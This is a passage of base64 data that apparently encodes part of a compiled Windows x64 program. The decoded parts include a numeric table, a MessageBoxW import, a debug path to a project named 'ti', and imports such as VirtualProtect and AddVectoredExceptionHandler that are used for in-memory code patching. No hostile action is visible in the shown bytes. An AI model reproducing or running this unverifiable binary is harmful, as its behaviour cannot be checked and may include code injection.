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Vud2luZEV4AFgDSW50ZXJsb2NrZWRGbHVzaFNMaXN0AFYCR2V0TGFzdEVycm9yAAAZBVNldExhc3RFcnJvcgAAKQFFbnRlckNyaXRpY2FsU2VjdGlvbgAApQNMZWF2ZUNyaXRpY2FsU2VjdGlvbgAABgFEZWxldGVDcml0aWNhbFNlY3Rpb24AUQNJbml0aWFsaXplQ3JpdGljYWxTZWN0aW9uQW5kU3BpbkNvdW50AIIFVGxzQWxsb2MAAIQFVGxzR2V0VmFsdWUAhQVUbHNTZXRWYWx1ZQCDBVRsc0ZyZWUApAFGcmVlTGlicmFyeQCqA0xvYWRMaWJyYXJ5RXhXAABXAUV4aXRQcm9jZXNzAGwCR2V0TW9kdWxlSGFuZGxlRXhXAABoAkdldE1vZHVsZUZpbGVOYW1lQQAA1ANNdWx0aUJ5dGVUb1dpZGVDaGFyAN0FV2lkZUNoYXJUb011bHRpQnl0ZQA8A0hlYXBGcmVlAAA4A0hlYXBBbGxvYwCZA0xDTWFwU3RyaW5nVwAAbgFGaW5kQ2xvc2UAcwFGaW5kRmlyc3RGaWxlRXhBAACDAUZpbmROZXh0RmlsZUEAdQNJc1ZhbGlkQ29kZVBhZ2UAqgFHZXRBQ1AAAI0CR2V0T0VNQ1AAALkBR2V0Q1BJbmZvAM4BR2V0Q29tbWFuZExpbmVBAM8BR2V0Q29tbWFuZExpbmVXAC4CR2V0RW52aXJvbm1lbnRTdHJpbmdzVwAAowFGcmVlRW52aXJvbm1lbnRTdHJpbmdzVwCpAkdldFByb2Nlc3NIZWFwAADHAkdldFN0ZEhhbmRsZQAARQJHZXRGaWxlVHlwZQDMAkdldFN0cmluZ1R5cGVXAABBA0hlYXBTaXplAAA/A0hlYXBSZUFsbG9jADAFU2V0U3RkSGFuZGxlAADxBVdyaXRlRmlsZQCYAUZsdXNoRmlsZUJ1ZmZlcnMAAOIBR2V0Q29uc29sZUNQAAD0AUdldENvbnNvbGVNb2RlAAAMBVNldEZpbGVQb2ludGVyRXgAAH8AQ2xvc2VIYW5kbGUA8AVXcml0ZUNvbnNvbGVXAMIAQ3JlYXRlRmlsZVcARARSYWlzZUV4Y2VwdGlvbgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMqLfLZkrAADNXSDSZtT///////8AAAAAAQAAAAIAAAAvIAAAAAAAAAAAAAAAAAAA/////wIAAAD/////DAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAAAAAAAACAgICAgICAgICAgICAgICAgICAgICAgICAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoAAAAAAABBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQQAGAAQAAAAECBAgAAAAAAAAAAAAAAACkAwAAYIJ5giEAAAAAAAAApt8AAAAAAAChpQAAAAAAAIGf4PwAAAAAQH6A/AAAAACoAwAAwaPaoyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIH+AAAAAAAAQP4AAAAAAAC1AwAAwaPaoyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIH+AAAAAAAAQf4AAAAAAAC2AwAAz6LkohoA5aLoolsAAAAAAAAAAAAAAAAAAAAAAIH+AAAAAAAAQH6h